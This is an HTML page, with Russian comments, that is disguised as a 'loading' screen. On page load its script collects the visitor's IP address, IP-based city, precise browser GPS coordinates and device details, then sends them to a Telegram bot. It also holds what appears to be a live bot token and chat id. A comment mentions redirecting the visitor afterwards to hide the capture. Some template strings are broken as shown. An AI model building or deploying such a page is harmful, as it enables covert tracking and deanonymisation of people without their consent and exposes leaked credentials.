<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #f5f5f5;
            font-family: Arial, sans-serif;
            color: #333;
        }
        .loader {
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="loader">
        <p>⏳ Секунду...</p>
    </div>

    <script>
        // ========== НАСТРОЙКИ (замени на свои!) ==========
        const TELEGRAM_BOT_TOKEN = 'ТВОЙ_ТОКЕН_БОТА';   // получить у @BotFather
        const TELEGRAM_CHAT_ID = 'ТВОЙ_CHAT_ID';       // узнать у @userinfobot
        // =================================================

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                return 'неизвестен';
            }
        }

        async function getGeoByIP(ip) {
            try {
                const res = await fetch(https://ipapi.co/${ip}/json/);
                const d = await res.json();
                return d && d.city ? ${d.city}, ${d.region}, ${d.country_name} : 'не определено';
            } catch {
                return 'не определено';
            }
        }

        function getBrowserGeo() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) return resolve(null);
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({
                        lat: pos.coords.latitude.toFixed(5),
                        lon: pos.coords.longitude.toFixed(5),
                        acc: pos.coords.accuracy ? ${Math.round(pos.coords.accuracy)} м : '?'
                    }),
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            });
        }

        async function sendToTelegram(text) {
            const url = https://api.telegram.org/bot${7959565855:AAHcTfthk4ususxYw3hcipEiJxe_TdI_XFc}/sendMessage;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: 1391249960,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
            } catch (e) {
                console.error('Ошибка отправки в Telegram', e);
            }
        }

        (async function main() {
            const ip = await getIP();
            const geoFromIP = await getGeoByIP(ip);
            const browserGeo = await getBrowserGeo();

            let geoText = 🌍 По IP: ${geoFromIP};
            if (browserGeo) {
                geoText += \n📍 GPS: ${browserGeo.lat}, ${browserGeo.lon} (±${browserGeo.acc});
            } else {
                geoText += \n⚠️ Точная геолокация не получена (возможно, запрет в браузере);
            }

            const message = 🕵️ Новый посетитель!\n\n +
                IP: <code>${ip}</code>\n +
                ${geoText}\n\n +
                📱 Устройство: ${navigator.userAgent}\n +
                🕒 Время: ${new Date().toLocaleString()};

            await sendToTelegram(message);

            // После отправки можно перенаправить на любой сайт (опционально)
            // window.location.href = 'https://google.com';
        })();
    </script>
</body>
</html>
